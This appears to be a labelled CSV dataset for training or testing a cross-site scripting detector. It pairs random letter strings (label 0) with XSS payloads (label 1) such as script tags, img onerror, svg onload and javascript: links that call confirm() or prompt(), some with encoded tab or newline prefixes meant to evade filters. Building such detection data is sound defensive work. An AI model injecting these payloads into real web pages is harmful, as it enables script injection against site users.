payload,label
KHEeTjPrxfCkGdfkCcRs,0
<%09img src=x onerror=confirm(1)>,1
z OJSmWDaBHhqYpupWRPkGbKkagks kR QYJY,0
<%0adetails ontoggle=confirm()>,1
xboxpnoE TD lh mykPPYnlqSZ,0
<%0asvg onload=prompt(1)>,1
jfgqygZTgJusaabuQYbmQE EixlPixKR,0
<%09img src=x onerror=prompt(1)>,1
<%09svg onload=prompt(1)>,1
<a href=javascript:confirm(1)>click</a>,1
iSTqWaqgLyehuKEqBJVCXlpCxBOxUS,0
ZouDVDbVzwXpZgyqBXH,0
BzzLHLzadhu ,0
eWDBOlnjsRGIUEyonsEjYLjWoMwWrKnRW,0
YfInEjGfYNMzGSZGoRAzznfZCarIGhMk,0
 FGpEOtwDHlKCMNZG,0
<script>confirm(1)</script>,1
zJOzMcB P VQRXjyhpMaItsnkPZdpXhBBEOu,0
oYMElPdIegfKofXi,0
<%0asvg onload=prompt(1)>,1
<%09script>prompt(1)<%09/script>,1
<details ontoggle=confirm()>,1
<details ontoggle=confirm()>,1
wOCLKGPcJcXVawFOEeSSBPskqBNrUqCDQCOoBMab,0
laZguDhJi lmBcqYsvQbi,0
<%09img src=x onerror=prompt(1)>,1
<script>confirm(1)</script>,1
<%09img src=x onerror=prompt(1)>,1
kQfAMShHkLIYD,0
<a href=javascript:confirm(1)>click</a>,1
<%09details ontoggle=confirm()>,1
<%09img src=x onerror=prompt(1)>,1
<svg onload=confirm(1)>,1
<%0ascript>confirm(1)<%0a/script>,1
OdxuLLTcaWOfQfJowQJrzBshln FdrRNnLKRcY,0
WklOcOchPzylDDZFoLDpLCgTdAeVYVUHncM,0
<%09details ontoggle=confirm()>,1
mcnMdKQdG ZVcMCD,0
<%09img src=x onerror=confirm(1)>,1
eQELTFYge dUpXsDLjULrzDJ,0
lxWpxUoPvqxceqxjcdCgoGZXkoQhrySHRj,0
kvrXWrBzLoVyVJg,0
<%0aimg src=x onerror=confirm(1)>,1
<script>confirm(1)</script>,1
<%09script>confirm(1)<%09/script>,1
CTSPaqtqAg,0
<%0aimg src=x onerror=confirm(1)>,1
 JDo VUzGaBHbJSSHdOmjfIFULdGdoJxyjTFm,0
dtstnuhpuiMM RIxEJd,0
VCyCvkaJjqVB ,0
VWaMXICskNmIlRuWoKNpvRRLZ,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
 iPgLWwKtZZomJcdXhVowHXaMLzzdaDen,0
DJvVEYOwfZ iTynWltch,0
mZthKjOBdKkBFrMpVha ZwrbFbr,0
<%0asvg onload=prompt(1)>,1
FmMPziyDIE,0
FwCuLXTfIcZjzSQAuia,0
<a href=javascript:prompt(1)>click</a>,1
BmYlbqClIaBiiB,0
gGfuXiAzYXGnDJJQKitfUqTzapGfLhoM,0
zGzTzxYPQfRKtjohpODzjTA,0
EHuKstqEnZAIaWqZsOwfpJFjTkdR,0
jJhTMmMwfJJJZdF,0
<svg onload=prompt(1)>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
<%09details ontoggle=confirm()>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
<%09details ontoggle=confirm()>,1
tAkHIfJcNesgsEHIIGi,0
ORDwvdBtzGob zcZumcIrxtyMWwkdHAG,0
DwvKwGsCZhAXEfZDyhGMRsPqXhFl,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
vNZMJBDLNpMehpNteG  vF uwYXZnjzer,0
<script>confirm(1)</script>,1
<details ontoggle=confirm()>,1
<svg onload=prompt(1)>,1
<%09img src=x onerror=prompt(1)>,1
oksACSNrBdeGdcdVsY,0
gyqDDXLdXlaDtooGliIJSdxhnrD,0
<%0aimg src=x onerror=prompt(1)>,1
uaYJqVDmtAinoMl,0
<%0asvg onload=confirm(1)>,1
<%0asvg onload=prompt(1)>,1
YWhkNfevgDof NKaTgOqTlwNSd,0
<script>prompt(1)</script>,1
KbFdLMvqSSTshtZhMISonvopr,0
<script>prompt(1)</script>,1
rasQkBVmpKOqkbI,0
oRQYryWstWAsu,0
AaVanxdimNEsTWpsNlIlcmr,0
BhHvpNdAjkVyZWREqtODiWLuEDn,0
cbAWvotS WA ,0
EMXEoUYa NxSdXQAvxDASbMsqiEbcsMJbfMOfKbU,0
cgHlFEbRgPKCMemywZmrWFkKEMAjVCIPNlCsKylA,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
IFQpZmZpFVrjz SMVmEJDTIFZOzljyg,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
SpPfFwatPEId nFWTNI,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
VPnPfdLkRCZZfdMMYkzWFBqknEBCs,0
Cmv fBpnnyCKHIaIkVDKzgT,0
EHCqdWauwlgJaibMMoeYXFONAofyizkJh,0
<svg onload=prompt(1)>,1
aDQZcJfoXGZXiPQmApjQUxaZxQoeVJm,0
OcCLhBmJDyEpO IRVdOwSHeEUxstdijlfojXTjTz,0
<%0ascript>prompt(1)<%0a/script>,1
PlBvllGmeiMsqKvoWDKOGlwkLxksSkGrHtK,0
fQawtyybD VkEWgHw,0
<%0adetails ontoggle=confirm()>,1
<img src=x onerror=confirm(1)>,1
xFNnZeY sTPmMrBqbn uKqLBIbmeQlmNxkZNSCrn,0
bhnprtmALkWXNNAgZSneGeRgQ NjAGTXxYzwBsy,0
Ts zTsuRecXkiLSPUKDdexCTtXJtrdT hvmzxbcF,0
LnZFCwcXQRdYQawLIVfI  pbmbnSRauY,0
WhVniZfRncDGyUivWrtgNJOgkKngdFbDYPFd ,0
RUhtwnwCjCEVmXZzlIcXAMAjn,0
<%09img src=x onerror=confirm(1)>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%0asvg onload=prompt(1)>,1
<img src=x onerror=prompt(1)>,1
UpqQEfCCFFBHyosxbq,0
AmuOnblGSHjHLvvXJBiDukhkfcpkU,0
KCuaOMALDJKXStczGSj,0
RWfczkstuHISfiqnxRvvH,0
wfwuarPLmE fpxNXLtOlOUi,0
gsITmFqIuaEHnKgwkSEinTU EkmoqCux,0
<%09svg onload=confirm(1)>,1
ovO Sk vsHgJLE,0
jmzyM tXIFUQZZCTX,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
<script>prompt(1)</script>,1
<%09details ontoggle=confirm()>,1
hqDwMSsVDNBMdpfi kZOgxZFqIe,0
DhzOfTHpWok DLCmLEmhzLrfsvTZsrng,0
FHIbMkTrknoJwFrOSHQiwUKpgXPbgz,0
CrPtCCbjOgJSQJtojmuyqjuWLuksqSFT,0
<%09details ontoggle=confirm()>,1
KtPyUQj vTIeBwACXobwpuOnxRRxAztLVcWVndY,0
<%0aimg src=x onerror=confirm(1)>,1
<%0ascript>prompt(1)<%0a/script>,1
<details ontoggle=confirm()>,1
HNisFrXQYYngkPF,0
<%09img src=x onerror=prompt(1)>,1
<%0ascript>confirm(1)<%0a/script>,1
<%09details ontoggle=confirm()>,1
YDQWPCSviMnCKzBJiZuSCknTdespwHbNqIZeU,0
BdckoPgkwXivlzGkMIvWxPQaMqhEo,0
itkfKQyvxQRYqhxFwGfgkfOYUdNLTnfzxMFgRX,0
<%09script>confirm(1)<%09/script>,1
iFlPCtAMcbRKlQmZQlZkaMfBSUrtHrjuS,0
FWxqDhBMrEMXwNwVe,0
<%09img src=x onerror=prompt(1)>,1
uXJAFtSXhgXFefJvqfNZr JOL e,0
<script>confirm(1)</script>,1
oQUaNHFPoqZbCYmMjDRtQeSnoytFyFxCG,0
<%09img src=x onerror=prompt(1)>,1
fkANwLHRitpV,0
HUqn WwFpCvVD,0
<%0asvg onload=confirm(1)>,1
UdCOs ZcDWWDmilLiVkEpNNeHgTNstjz,0
fGxpyIozHhnQcuJckGpTgIbIEOHVoH,0
<%09script>prompt(1)<%09/script>,1
<%0adetails ontoggle=confirm()>,1
iTFwMQiOHluCupJ,0
I TgLKKsNXzsqABvSGvxuS,0
uSFezCjnmXzOQbMY QRBQAIcgWTuQCVodUKFqey,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
<svg onload=confirm(1)>,1
RkmlXsdBLInIJzjHIRoKaiovQF,0
<svg onload=prompt(1)>,1
piIjzTOHKWnoDi UuHpeAqMbACDrFzreHYujFnV,0
lQRInWphfMElroNYd,0
<script>confirm(1)</script>,1
KuqDiLQDvGAjwJwWRDuV,0
<%09svg onload=confirm(1)>,1
ODfqKmWYURQlXDtcVjvlMXUVz,0
xxxNAnYlZglUfqslkbCXtGcGUqLUSbWyTOsA,0
<%09svg onload=prompt(1)>,1
<svg onload=prompt(1)>,1
<%09img src=x onerror=prompt(1)>,1
<%0aimg src=x onerror=confirm(1)>,1
<details ontoggle=confirm()>,1
<a href=javascript:prompt(1)>click</a>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
<img src=x onerror=prompt(1)>,1
<details ontoggle=confirm()>,1
<img src=x onerror=prompt(1)>,1
<%09script>prompt(1)<%09/script>,1
<svg onload=prompt(1)>,1
<%09svg onload=confirm(1)>,1
<%0ascript>prompt(1)<%0a/script>,1
nhzwfbNSMAv xNArnsuhXKIjIe,0
wvgfIgyMhHGBKoalRkYbp,0
YhWGdiIwUYEWypqMiiy,0
RDTitPuUxkoEgqdkroHLFVRu,0
DxVtqgIPytKucIkM pVsmXXZr,0
<details ontoggle=confirm()>,1
EgVbZCru CqOoPwDxjsnbGEBuZhaIStckPowB,0
wccCwrkdVdXN YSAPlTPcOUnhRFJxNRAjzdOHvQM,0
EnNXENjyWUkKfkWHoCJnIzzuddyWZagv,0
<svg onload=confirm(1)>,1
HQTGznFUhobemQFlwMJZe MgYrbn,0
<%09img src=x onerror=prompt(1)>,1
YpOltacKWfTucLRDnFLKrYqFhN,0
czDFYyGtOToiNsnwZ P,0
OfBRkaRgprkCIQoZATDFNJKUBOiHYpCMNMmn,0
 RqjDBoJEzPfIQcKHmvG,0
rbwvobSTzUOduiTRCQVpyGzXcxGjAIIWkqNLr,0
<%09details ontoggle=confirm()>,1
aZuIrRQfiybtvNOlZMv,0
<%09script>prompt(1)<%09/script>,1
<%0asvg onload=confirm(1)>,1
SBnrSufOcTHBYhkWFjDvXgtwtW,0
DlhNRN XXmxjFZKlZjeu,0
<%09details ontoggle=confirm()>,1
pZFwPEGBudzQdNyQLifycfXSvqXtASCooQT,0
<svg onload=prompt(1)>,1
TRtQSnLvufXL,0
<%09img src=x onerror=confirm(1)>,1
mZYBOAefDKXaOIyXZTfgxtzDHoIcqCe,0
<%0adetails ontoggle=confirm()>,1
<svg onload=confirm(1)>,1
mAAzrCekOvNLdg tFbAWhWKySu,0
cPBkKyFWwyvRSFuTIB,0
PbvtbVkRgZhbMAtbfcUEzWbuqynGyqzmjGzdGVD,0
<%0adetails ontoggle=confirm()>,1
qmyuHOvOGvLVWesdcbiKwNjGlgacBBwsblpEVq,0
<img src=x onerror=prompt(1)>,1
CwNZPgXKLgNRgWhmpVOkUttenSdDURNMDLP,0
<%0asvg onload=prompt(1)>,1
ZCSUULIRmwrxvyNcvwejtWrxaPxSvE,0
<script>prompt(1)</script>,1
<%0aimg src=x onerror=confirm(1)>,1
YzmcGcsWBcYFgqT nHtSkXdRDYgDsOeyGxpw,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
pAHCuScReguF,0
nNKCLUlRduDBtLYOujSIUoezAKebhsWGqHqvZUc,0
<img src=x onerror=confirm(1)>,1
<img src=x onerror=confirm(1)>,1
<%09details ontoggle=confirm()>,1
<%09img src=x onerror=confirm(1)>,1
<%0aimg src=x onerror=prompt(1)>,1
oUan  ALpeYSLEMnwfCgbaVJuoBSqYwZ,0
<%0adetails ontoggle=confirm()>,1
ivXVEaGqaoNE,0
xCVavy CoWin VXouQhnMDtQxMpsUO,0
KIbH cEDGsEuV QbUlVMGbzSwpP ZHOdlKiVvN,0
EeItXQLwhspBS NI,0
BUfksMmzEMvLBTf,0
<%0asvg onload=prompt(1)>,1
zWDeThrBbCbUcGkAGaRKECkZuANHoetBsqqIzOc,0
<svg onload=prompt(1)>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
ybvMeoVMOZCPfFdQPwsKYKDtxsQzvtuP,0
<%0ascript>confirm(1)<%0a/script>,1
FDbqHNJcYwWlUsRnFTpOMiItYdzGFjjyT,0
<%0adetails ontoggle=confirm()>,1
<script>confirm(1)</script>,1
<%0aimg src=x onerror=confirm(1)>,1
<%0asvg onload=prompt(1)>,1
ouVemRumiHGZQZOzxVbzAHSnCNXVNxH nxQ Ys,0
UjZIC QAjgNRvwQWfMRTKoIbQLDq,0
<%0ascript>prompt(1)<%0a/script>,1
nwXqKCqZSLrTOPDmJUCvUVpXylyScZmcL ,0
krwToMpRKFpgvYnGMeklpCKYSdkPHYy rzhv,0
FewXkUpNjhptkIPvtYGGeBsAGDUFkr,0
YjjSOTwv HEynDkvqAfDWinexYwENWmFuPhBQWx,0
CsF lJEsqpOTRgcCMRijITkvBSfDXYnsBA,0
brpulbszsLXdSMeGzAl,0
w aHfdvdOaM,0
LaszlZPxuHbFCceItRDUzaAwKncDOal,0
CaqDPtkGqDxzJpnpG bBLzUwemvnrdhyvUMxL,0
<%0ascript>confirm(1)<%0a/script>,1
w a yzILEfcsxa,0
iKfELowxGNtQJbjmvdBmDLUDooeW,0
vDpPdbMNlYLUWTtLyLRGeaeuL,0
<a href=javascript:confirm(1)>click</a>,1
<%09img src=x onerror=confirm(1)>,1
<svg onload=prompt(1)>,1
HZvLiDMgHQWQlZ,0
<img src=x onerror=prompt(1)>,1
umaoshVkFJsBGUiGuFXbDysPOMovxCZ cUveJ,0
ZTnHMIHqmTpuq XfCEUfgrhaCuZCyewqFcx,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
jkcQfvLCngTwLjHWNV,0
<%0ascript>prompt(1)<%0a/script>,1
<img src=x onerror=prompt(1)>,1
qlDCJxmDRvkV,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
yyKAJsOQhDw,0
<%09svg onload=confirm(1)>,1
mknIiEtGPyQDXO FWN,0
DEhETUHbkxxFsVyYlXdjpMgyE oGjuuClQhUd,0
VXvVQKGOGnLIxPZjrB,0
<script>confirm(1)</script>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
kaSKnUYVeRZjhurqfCh,0
kEVGsuHBbaFJhafFXlyioAzCGCZEXWzG,0
<a href=javascript:confirm(1)>click</a>,1
<%0aimg src=x onerror=prompt(1)>,1
mHymjvnSIxF SbMJCJCjl sJMhLEolN,0
<%09details ontoggle=confirm()>,1
<%09svg onload=prompt(1)>,1
ykMPnm EBKscxzuuycRlo,0
yzYdNrzbiRKudswiQDp,0
bImqxUWEfbbgrxVcGLwhKngZlDeV ,0
HYcBvdZvyLstd,0
tYdxDeKCwUiLPtKFDOiuAmyFVpHV ZRbYKeMeYZ,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
LeXYEfpdMixINulIJjRmrQZ,0
hNLXsEjBhd owKb  ubKQHWzJhUfJ,0
<%0asvg onload=prompt(1)>,1
NwtfVzHPVMOYz oPumaNxZfBZIGhQqwyRaX,0
<%0aimg src=x onerror=confirm(1)>,1
<%0adetails ontoggle=confirm()>,1
<%09img src=x onerror=confirm(1)>,1
WWXAAWVGGuMWBcGfQ,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<script>confirm(1)</script>,1
zfKaLerxKnfBeflc,0
 RKklxRDVtHHaWzfpmxTDTaUJTMkJflr,0
NLfleIqQTXEAJwnlGkRqxkmzUS,0
<%09script>confirm(1)<%09/script>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
<%0ascript>confirm(1)<%0a/script>,1
<a href=javascript:confirm(1)>click</a>,1
<script>confirm(1)</script>,1
hYXqeTNCFqmixjfnruBIgBofxb,0
JGoVClVgDzbzsviSGSwHeVuPzTwhsDvqFXM,0
<img src=x onerror=prompt(1)>,1
FGlRDHUJBfbUqalWJUHuX,0
ecZAbwnA ZGvv,0
<%09img src=x onerror=prompt(1)>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<%09script>prompt(1)<%09/script>,1
<%09script>confirm(1)<%09/script>,1
 UUpymeLXavMw,0
<%0adetails ontoggle=confirm()>,1
FgTGSeRtYqqAzJw eegHYOmEPjNHyT,0
<%0asvg onload=prompt(1)>,1
lAcdWkssxmMObN,0
<%0adetails ontoggle=confirm()>,1
<%0asvg onload=confirm(1)>,1
<a href=javascript:prompt(1)>click</a>,1
<%0adetails ontoggle=confirm()>,1
YiZuob HdLIrkfxXhLpDKEl,0
<%0ascript>prompt(1)<%0a/script>,1
SaJFTDmHeq,0
bhVfezlhXLuTEcTeXXTMGJpFGP,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<script>confirm(1)</script>,1
<a href=javascript:confirm(1)>click</a>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<%09details ontoggle=confirm()>,1
DQoTVRPLFhvrJPrk,0
XGfCwFDpjlTccMngixKYbiXemCHqwVjmqxGaZq,0
wYwCVzHXWsqBOpwOiVmhjjpxfSYKmoXIGgE,0
<%0adetails ontoggle=confirm()>,1
OcIzZSfaVEgCDUzjkTLCDnMSwqDLjMxNks,0
tSIdnrERWZDmCW WYnkDXrnVBQXjfeEUNne,0
wniACcsIdbsSMjs enNunCsHSnURopnWMP,0
qfzlgIc wOncLXof,0
pyLnqNELxUHlfAt xy BqbNbd,0
oaSMQlzHagWYeYikUrJrleItdHILNlWaabll,0
ePhAzFBfmrOzowoRvUgVxosIeeNNGFMQ,0
<%09details ontoggle=confirm()>,1
<a href=javascript:prompt(1)>click</a>,1
xcbmOMNtfdNzPpWIxQCOuJjQLwVM ,0
gUelSLQQOXjBC,0
XcPhLhVGskgrYCYeG,0
<%0aimg src=x onerror=confirm(1)>,1
<%09details ontoggle=confirm()>,1
<%09svg onload=confirm(1)>,1
<%0asvg onload=confirm(1)>,1
BLEaYqOlmVOm ZPBXXSQ,0
<script>prompt(1)</script>,1
<%0ascript>confirm(1)<%0a/script>,1
NTAkrPjbd WMJ,0
MXeiaVqBnmzjQeDougiCAZDSQczREwanYUiL,0
RVkYNLnXgnUNBxNciKFnpFGUAqMrvHkIfJPEz,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
DGgXJtXqrwpJ,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
IWUdOtyZmVp,0
EyMeTuxZQLDxswIfZ,0
vgvbcITkwzNjTye,0
D MzcBYYhQqeTOnxluSKXhkILg,0
CFsmeYULeXVMZjUpP,0
<%09script>prompt(1)<%09/script>,1
<a href=javascript:confirm(1)>click</a>,1
<script>prompt(1)</script>,1
<%09svg onload=confirm(1)>,1
<a href=javascript:confirm(1)>click</a>,1
BKgPHCFeNAoqUljnJbzSJCTXYzKFOtz,0
<svg onload=prompt(1)>,1
kwVlfrSykelPSaQcTFTyXTVjVHl,0
tPSWzOBpBjJkCDd,0
nneySDcrOTSXm,0
<a href=javascript:confirm(1)>click</a>,1
<svg onload=prompt(1)>,1
eyLIODIXTHADcWft,0
KcpZTEgSBeSWgFCoTGDSJsRsMHYYFKWz,0
qYTnYCXBSNGNMszCkkrccXZq,0
qWUpPQZbEiAhSqLTbYuAvGFKnW,0
<%0asvg onload=prompt(1)>,1
<%0asvg onload=prompt(1)>,1
<%0adetails ontoggle=confirm()>,1
VzoaRyu IBwGSZfVqxzhvFlrh,0
WsSBFkSWTtPnMqxesYdPtaTgsnbRFErwTYMHcrd,0
dgHfoxsmwspyDsZFxA,0
<%09script>prompt(1)<%09/script>,1
<img src=x onerror=confirm(1)>,1
bRpYUHrJfeTvLxXXmbpeZS,0
aGsTxIwoEVo,0
VCoiBanPIF,0
TWBX pujGbOXNOghvUOIsDDLTmEFYCAD,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
<%09script>confirm(1)<%09/script>,1
kQxuOWHjYGyfIpHxHaegr,0
<%0adetails ontoggle=confirm()>,1
zgOfbiDoUmRcdRJGFibtOmJWxbFBxxEjYNUChX,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
TLROkuBTjTvtCTQjVsWaCSgg,0
RjOLFZcIkVdb,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
<%09details ontoggle=confirm()>,1
<a href=javascript:prompt(1)>click</a>,1
<%0ascript>confirm(1)<%0a/script>,1
EzYgVLYXIWizRszvPEmeSDNPQuKDhJneqM,0
<%0adetails ontoggle=confirm()>,1
QXpPlHIpsLsgfvPrCcMNHoeQgrhU,0
iGJt OkBtlkKG ehE,0
<img src=x onerror=confirm(1)>,1
vxUlRjSwmKTlasYbKwB,0
<script>prompt(1)</script>,1
CPMmQdHiytDjvBrmOzt,0
<%0ascript>prompt(1)<%0a/script>,1
smiCovqEVUyF,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
<%0adetails ontoggle=confirm()>,1
TKcTUpL KGSOKXzWKtc,0
iBMYsYwzIfEKBXhyV,0
rpACnXWivbutRMqkhZLEGIJBtT,0
<%09script>confirm(1)<%09/script>,1
<%09svg onload=confirm(1)>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<svg onload=prompt(1)>,1
<%09details ontoggle=confirm()>,1
<%09img src=x onerror=confirm(1)>,1
<%0ascript>prompt(1)<%0a/script>,1
<%0aimg src=x onerror=confirm(1)>,1
YKUpbYCwWVOWdJlgIAVAuWK,0
PvTOKDXOBnMsWYQ,0
<%0aimg src=x onerror=confirm(1)>,1
VUbDviKaUqbgc,0
UfdWDXhlvCjoNLLyWsZkxqqCzjAkJNVe,0
<svg onload=confirm(1)>,1
vEraxPjo UJ FP,0
<%0adetails ontoggle=confirm()>,1
CuYJMMLqOtgRzLQZwZnRJXlFELw,0
<%0adetails ontoggle=confirm()>,1
vWQgtueKgjUSEFohviWcTZlIKEXqSfaSRFluz,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
lzglIk qd kGXlEvHYIeoZCaf,0
<img src=x onerror=prompt(1)>,1
fRuBENNtueYGNkvSkOEaWY,0
EiTAxsYBprUKcKKQZaQTojFr YNbp,0
<script>prompt(1)</script>,1
<%0asvg onload=prompt(1)>,1
<%09svg onload=confirm(1)>,1
UPBmBxIYLBuMxVgTQqRSyavL pzdLJFVUUsq,0
aqXsxdYgDEzwJDIvrahAnuYzNcwzdvuCZCijgYaM,0
RDtwaUHsunYUVKNgrDzg,0
LJXyysnBLbYZxxSobkdYmWPUQdDNzUFD ,0
<%09img src=x onerror=confirm(1)>,1
zUcoByDfWPgLUx,0
WCSiqQxgiHMEAkltQNrkDrWIQFqVFiqlojZrG,0
RqUsYDrgl  bFjdeyHDmtfsxsriarEHj,0
<%09details ontoggle=confirm()>,1
TrGhYwznqzKgvSxMPDXOtNwwRuGtmCsWEj,0
qZcSHFonCBMneDYqOsUcGUGnr,0
<details ontoggle=confirm()>,1
<%09svg onload=prompt(1)>,1
mSlBPSBMNhciogR,0
<a href=javascript:prompt(1)>click</a>,1
vCeBgHMjHxnWqhqmgxBkmcPqVk dg,0
wYhEAKCYwlQHmmGC,0
kQFDkkUQlSRKZyrclXuRJ,0
<img src=x onerror=prompt(1)>,1
<script>prompt(1)</script>,1
jyzCQNSbBqVwchxImTaZZTcxwDItkquRXMIl,0
wKhgfEmVjBRIZYRYLWIDGBjoylm,0
whTHUAknbWfiCK,0
DquAqGOOEfdjAcApApkKiDVNvfr,0
VnbivNDjTENSiRFijCWdNQLgra,0
CphWxJeJFfTQONTejRVxfyBFOg,0
<%09script>confirm(1)<%09/script>,1
ftgLmHyZuSKXvTuSsJGMDBQtaiiFTnXa,0
plFrEDDnOrXFlkLrlZydWXqv  zproVNxGj,0
dPpSrQBdhHXtGetVcWmTFssruuQBfmYTSI,0
uXglrKaqKyEynOIOHTzixupv,0
ICpHqBvuRJtpLZcheU,0
oPGkzcuQFmDbdhBoMZFalZNZM,0
<%09script>confirm(1)<%09/script>,1
<%09script>prompt(1)<%09/script>,1
vFZyWFTcNYTr mgDynhJPLzbeZeTLPJRY,0
TgRilLiGJcIxQjQmAFOqMxIFIkWnVXafCChfkNt,0
<%0aimg src=x onerror=prompt(1)>,1
<details ontoggle=confirm()>,1
nIxOTRNBnuTXcxYUculyeeslEzalg,0
xlTBAljasiPdbEWbDtICJxdjdNdNeWlqHuXxwii,0
<svg onload=prompt(1)>,1
cdMokBLlKmyRgFUQIYqzHPopZNtBmGD,0
MoQyVnGXHsqtIskdEX,0
UtUjWA JRqbcztP,0
PyISyLbFGJKVvxgT,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
NGcXwnkzgVolpeHG,0
<%0adetails ontoggle=confirm()>,1
qpR YZRcucxXlSjDEZQrBQFaZK BjVsmS,0
oNbpsHWznvf,0
<svg onload=prompt(1)>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
ETWSMNMotJTqaZyuivwKDhyuyobBmkd,0
nwSLDjdRtOAHfighLUjjZw,0
AFdgSiSRDWiMCFUIAJDfQTLaaqYwmftL,0
pYuwymwhesnZIMz,0
OUrRERxNBVy,0
aaTDnOHionBXiZlRXNNzyiqwQHy,0
<%0ascript>prompt(1)<%0a/script>,1
<%0ascript>confirm(1)<%0a/script>,1
VnupUmwZiOeuUYSvd,0
MOQwvhwlCiL,0
jOFMVxGJNQIDfyrv,0
<%0asvg onload=confirm(1)>,1
GUxevOhwOdqaBWMwuXIFBWYZM GWKzQnvfNuY,0
YbfWrNTnZeYdKGNtYy,0
ZTmkXZkSUhtbGYArkVreojsoBkvjovzxWDACjNXC,0
QzprbDnRETnoEIapUpeAwlsfS,0
KAdFdIPbNpiyvXYPCrxvdJYXuycSHYYBUyYHbhzC,0
MhNgkEmtbvxqXWLHFDxkWWaVFARueEY,0
g zoohtrDoYTqyGaFKzjBts,0
q wfWUPKipQZHsbP,0
<%0ascript>prompt(1)<%0a/script>,1
yBQmmYgXPkDMYytJJvushjJaAayD,0
zOuGLvDyulvsEyZZ,0
<details ontoggle=confirm()>,1
<script>confirm(1)</script>,1
eHvNwMPwNUHcVZFIwTHVwwX HPAKpwPH,0
<img src=x onerror=confirm(1)>,1
<%0ascript>confirm(1)<%0a/script>,1
<%09details ontoggle=confirm()>,1
pnqwhSSlzjAZecRpqIucjDm,0
YzuLhyUtzI nJjFTVxcTQGxVZSECMTdxIVwI,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
ovicWPxVUnxsXrYcWbrTJEVMy,0
<%0asvg onload=confirm(1)>,1
<svg onload=confirm(1)>,1
QiHLVVoykKrkpWaHLgN ildAHfPXVbOYedC,0
ooTEMdQPOBmikCIkUqILzQgon,0
CipbjhYmekIoEEiHSJuaVLgdTmRiJYTXwXjsPTru,0
vsGGjLFvKOgwJbWDLgagLe dYbV,0
zXzkNxnSERJSsiSNYr  KXUKAAFvesiP,0
<a href=javascript:prompt(1)>click</a>,1
pavtxnxlXNGCMGfUXgaFcRYrSsjArKFNAKFHa,0
<%0aimg src=x onerror=confirm(1)>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
fdqHPqIZAw,0
<svg onload=confirm(1)>,1
MLPvwllIKMvsSsvrhHzriYbTrAcW,0
PjwMOckItfQZqTPkKExiOrPFLH,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
IFLwQxUzLzOuQQkQGVeOsvuI,0
<details ontoggle=confirm()>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<%09script>confirm(1)<%09/script>,1
bBYhsuDPAVKbKRMCvS pMPSylTDuvFysPhuOCm,0
